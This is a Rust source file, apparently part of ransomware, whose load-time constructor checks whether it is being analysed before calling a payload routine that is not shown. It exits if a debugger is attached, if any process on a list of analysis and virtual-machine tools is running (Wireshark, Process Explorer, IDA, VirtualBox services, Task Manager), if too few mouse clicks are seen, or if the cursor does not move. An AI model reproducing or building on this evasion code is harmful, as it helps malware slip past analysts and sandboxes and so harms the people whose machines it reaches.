mod execution;
use sysinfo::{ProcessExt, System, SystemExt, PidExt};
use windows_sys::Win32::{System::{Diagnostics::Debug::IsDebuggerPresent, ProcessStatus::EnumProcesses}, UI::{Input::KeyboardAndMouse::{GetAsyncKeyState, VK_RBUTTON}, WindowsAndMessaging::GetCursorPos}, Foundation::POINT};

// Checks your mouses location. If it is stable over hundred seconds than application will be crash.
fn check_cursor_position() -> std::result::Result<(), ()> {
    let mut cursor: POINT = POINT { x: 0i32, y: 0i32 };
    unsafe {GetCursorPos(&mut cursor)};

        let x = cursor.x;
        let y = cursor.y;

        let hundred_sec = std::time::Duration::from_millis(100000);
        std::thread::sleep(hundred_sec);

        unsafe {GetCursorPos(&mut cursor)};

        if x == cursor.x && y == cursor.y {
            std::process::exit(0);
        }

    return Ok(())
}

// Checks Debugger
fn anti_debugger() -> Result<(), ()>{
    match unsafe {IsDebuggerPresent()} {
        0 => {    
            return Ok(());
        },
        _ => {
            println!("Debugger is present... Terminating. Code {}", unsafe {IsDebuggerPresent()});
            std::process::exit(0);
        }
    }
}


// Checks Mouse clicks then count them.
fn check_mouse_click(min_clicks: u32) -> std::result::Result<(), ()> {
    let mut count: u32 = 0;

    while count < min_clicks {
        let key_left_clicked = unsafe { GetAsyncKeyState(VK_RBUTTON.into()) }; //Gets Number Of Mouse Clicks
        if key_left_clicked >> 15 == -1 {
            count += 1;
        }
        let hundred_sec = std::time::Duration::from_millis(100000);
        std::thread::sleep(hundred_sec);
    }
    return Ok(());
}

// Checks danger process for ransomware.
fn check_process() -> std::result::Result<(), ()> {
    let mut a_processes: Vec<u32> = Vec::with_capacity(1024);
    let mut i = 0;
    while i < 1024 {
        a_processes.push(0u32);
        i += 1;
    }
    let mut cb_needed: u32 = 0u32;
    let mut _c_processes: u32 = 0u32;
    if unsafe { EnumProcesses(a_processes.as_ptr() as *mut u32, 1024 * 4, &mut cb_needed) } == 0 {
        std::process::exit(0);
    }

     // Calculate how many process identifiers were returned.
    _c_processes = cb_needed / 4;
    let mut current_processes: Vec<String> = Vec::new();
    let mut count = 0;
    while count < _c_processes {
        if a_processes[count as usize] != 0 {
            let process_name = match print_process_name_and_id(a_processes[count as usize] as u32){ //Gets Processes Name By Their Name
                Ok(e) => e,
                Err(_e) => "".to_string(),
            };
            if process_name.len() != 0 {
                current_processes.push(process_name);
            }
        }
        count += 1;
    }

    // List of unwanted processes
    let sandbox_processes = [
        "vmsrvc.exe",
        "tcpview.exe",
        "wireshark.exe",
        "fiddler.exe",
        "vmware.exe",
        "VirtualBox.exe",
        "procexp.exe",
        "autoit.exe",
        "vboxtray.exe",
        "vmtoolsd.exe",
        "vmrawdsk.sys.",
        "vmusbmouse.sys.",
        "df5serv.exe",
        "vboxservice.exe",
        "ida64.exe",
        "ProcessHacker.exe",
        "Taskmgr.exe"
    ]
    .to_vec();

    let mut found_processes: Vec<&str> = Vec::new();
    for process in current_processes.iter() { 
        for sandbox_process in sandbox_processes.iter() {
            if &(process.to_lowercase()) == &(sandbox_process.to_lowercase()) { //Comparing Current Processes with Unwanted Process
                found_processes.push(sandbox_process);
            }
        }
    }

    if found_processes.len() != 0 {
        std::process::exit(0);
    }

    return Ok(());
}

// Prints process name by using PID's.
fn print_process_name_and_id(proc_pid: u32) -> Result<String, String> {
    let system = System::new_all();

    let mut process_name = None;
    for (pid, process) in system.processes().iter() {
        if pid.as_u32() == proc_pid {
            process_name = Some(process.name());
            break;
        }
    }

    // Pid numarası varsa ekrana yazdır, yoksa hata mesajı ver
    
    match process_name {
        Some(pid) => Ok(pid.to_string()),
        None => return Err(format!("{} programı bulunamadı.", proc_pid).to_string()),
    }
}


#[ctor::ctor] //Marks a function or static variable as a library/executable constructor.
fn ctor() {
    match anti_debugger(){
        Ok(_e) => (),
        _ => std::process::exit(0)
    };
    match check_process(){
        Ok(_e) => (),
        _ => std::process::exit(0)
    };
    match check_mouse_click(120){
        Ok(_e) => (),
        _ => std::process::exit(0)
    };

    match check_cursor_position(){
        Ok(_e) => (),
        _ => std::process::exit(0)
    };
    
    match execution::execute(){
        Ok(_e) => (),
        _ => std::process::exit(0)
    };
}
